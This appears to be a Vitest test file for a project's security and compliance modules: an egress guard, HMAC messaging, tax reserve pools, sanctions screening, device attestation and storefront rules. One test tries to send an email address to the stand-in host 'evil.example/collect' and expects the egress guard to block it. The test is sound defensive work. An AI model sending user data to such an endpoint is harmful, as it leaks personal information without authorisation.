import { createRequire } from "node:module";
import { afterEach, describe, expect, it } from "vitest";

const require = createRequire(import.meta.url);
const { evaluateEgress } = require("../lib/security/egressPolicy.js");
const { guardedFetch, resetEgressAudit, egressAudit } = require("../lib/security/egressGuard.js");
const { createMessenger, resolveHmacSecret } = require("../lib/security/secureMessaging.js");
const { postNetIncome, listPools, payTax, resetPools, POOL_COUNTRIES, RESERVE_RATE } = require("../lib/commerce/taxPools.js");
const { screenCompliance } = require("../lib/commerce/sanctionsScreen.js");
const { evaluateDevice } = require("../lib/security/deviceStandard.js");
const { recordMeasurement, assessTextile } = require("../lib/storefront/textileProgram.js");
const { publishBanner, coverage, previewBanner } = require("../lib/storefront/holidayProgram.js");

describe("special-16 phase 4 security and foundations", () => {
  afterEach(() => {
    resetEgressAudit();
    resetPools();
    delete process.env.BUZZARD_PRODUCTION;
    delete process.env.BUZZARD_MSG_HMAC;
    if (process.env.NODE_ENV === "production") process.env.NODE_ENV = "test";
  });

  it("blocks classified and external-AI egress before the network", async () => {
    const original = globalThis.fetch;
    let fetched = false;
    globalThis.fetch = async () => {
      fetched = true;
      throw new Error("network must not run");
    };
    try {
      const denied = await guardedFetch("https://evil.example/collect", {}, { email: "a@b.c" });
      expect(denied.reachedNetwork).toBe(false);
      expect(denied.decision.code).toBe("EGRESS_DENIED");
      const ai = await guardedFetch("https://api.anthropic.com/v1/messages", {}, { ping: true });
      expect(ai.reachedNetwork).toBe(false);
      expect(ai.decision.code).toBe("EXTERNAL_AI_EGRESS_DENIED");
      expect(fetched).toBe(false);
      expect(evaluateEgress({ destinationUrl: "https://api.openai.com/v1/chat", payload: {} }).allowed).toBe(false);
    } finally {
      globalThis.fetch = original;
    }
    expect(egressAudit().some((row) => row.allowed === false)).toBe(true);
  });

  it("keeps HMAC required and ignores caller override in production", () => {
    expect(createMessenger({}).send({ fromId: "pusat", toId: "dogu_bey", text: "x" }).code).toBe(
      "HMAC_SECRET_REQUIRED"
    );
    process.env.NODE_ENV = "production";
    delete process.env.BUZZARD_MSG_HMAC;
    const locked = resolveHmacSecret("a-long-passed-secret-that-is-not-env----");
    expect(locked.code).toBe("HMAC_PRODUCTION_LOCK");
    process.env.BUZZARD_MSG_HMAC = "P".repeat(32);
    const envLocked = createMessenger({ secret: "weaker-passed-secret-should-not-win" });
    const sent = envLocked.send({ fromId: "pusat", toId: "dogu_bey", text: "brief", classification: "shared" });
    expect(sent.ok).toBe(true);
    expect(envLocked.verify(sent.message)).toBe(true);
    delete process.env.BUZZARD_MSG_HMAC;
    process.env.NODE_ENV = "test";
  });

  it("posts 25% reserve on 26 pools and refuses payment", () => {
    expect(POOL_COUNTRIES).toHaveLength(26);
    expect(POOL_COUNTRIES).not.toContain("DE");
    expect(RESERVE_RATE).toBe(0.25);
    const posted = postNetIncome({ country: "FR", netIncome: 100 });
    expect(posted.entry.reserve).toBe(25);
    expect(posted.entry.spendable).toBe(75);
    expect(posted.paymentAuthority).toBe(false);
    expect(payTax({ country: "FR", amount: 25 }).code).toBe("PAYMENT_AUTHORITY_DENIED");
    expect(postNetIncome({ country: "DE", netIncome: 100 }).code).toBe("DE_USES_PRIOR_APPROVAL_RULE");
    expect(listPools()).toHaveLength(26);
  });

  it("sends sanctions uncertainty and dual-use to human review", () => {
    const dual = screenCompliance({ destination: "FR", value: 80, dualUse: true });
    expect(dual.status).toBe("HUMAN_REVIEW");
    expect(dual.approval.status).toBe("WAITING_APPROVAL");
    expect(dual.sanctionsCleared).toBe(false);
    const parties = screenCompliance({
      destination: "NL",
      value: 50,
      parties: [{ name: "Unknown GmbH", cleared: false }],
    });
    expect(parties.status).toBe("HUMAN_REVIEW");
    expect(parties.code).toBe("PARTY_NOT_CLEARED");
  });

  it("never marks device security COMPLETE without live attestation", () => {
    const paper = evaluateDevice({
      full_disk_encryption: true,
      bitlocker: true,
      strong_pin_or_password: true,
      mfa: true,
      recovery_keys_in_vault: true,
      remote_lock: true,
      cryptographic_wipe_not_physical_destruction: true,
      session_audit: true,
      backup_restore_test: true,
    });
    expect(paper.ok).toBe(true);
    expect(paper.completeClaim).toBe(false);
    expect(paper.acceptanceStatus).toBe("CODE_READY");
    const attested = evaluateDevice({
      full_disk_encryption: true,
      bitlocker: true,
      strong_pin_or_password: true,
      mfa: true,
      recovery_keys_in_vault: true,
      remote_lock: true,
      cryptographic_wipe_not_physical_destruction: true,
      session_audit: true,
      backup_restore_test: true,
      attestedFromDevice: true,
    });
    expect(attested.completeClaim).toBe(false);
    expect(attested.acceptanceStatus).toBe("SECURITY_REVIEW");
  });

  it("keeps textile and holiday requirements without claiming live complete", () => {
    expect(recordMeasurement({ consentMeasurements: false, values: { chest: 90 } }).code).toBe("CONSENT_REQUIRED");
    expect(assessTextile().completeClaim).toBe(false);
    expect(assessTextile().liveVerified).toBe(false);
    expect(publishBanner().code).toBe("NEEDS_APPROVAL");
    expect(coverage().completeClaim).toBe(false);
    expect(previewBanner({ country: "DE", today: "2026-10-03" }).published).toBe(false);
  });
});
